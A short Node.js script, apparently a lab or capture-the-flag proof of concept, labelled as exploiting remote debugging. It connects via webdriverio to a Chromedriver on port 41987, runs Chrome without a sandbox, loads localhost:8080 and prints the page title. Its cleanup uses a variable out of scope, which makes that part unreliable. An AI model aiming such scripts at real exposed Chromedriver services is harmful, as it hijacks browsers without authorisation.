const { remote } = require('webdriverio');

console.log("[+] Exploiting remote debugging")


async function main() {


    try {
          // Define the options for the Webdriver session
    const options = {
      port: 41987, // The port your Chromedriver is listening on
      path: '/', // The default path
      capabilities: {
          browserName: 'chrome', // Specify the browser
          'goog:chromeOptions': {
              args: ['--no-sandbox', '--headless'] // Add any additional Chrome options
          }
      }
  };

  // Connect to the Chromedriver instance
  const browser = await remote(options);
        // Use the browser instance to navigate to a URL
  await browser.url('http://localhost:8080'); // Change this to your target URL
        const title = await browser.getTitle(); // Get the page title
        console.log(`Page title: ${title}`); // Print the title to the console
    } catch (error) {
        console.error('Error during WebdriverIO session:', error); // Handle any errors
    } finally {
        // Close the browser session
        await browser.deleteSession();
    }
}

// Execute the main function
main().catch(console.error);
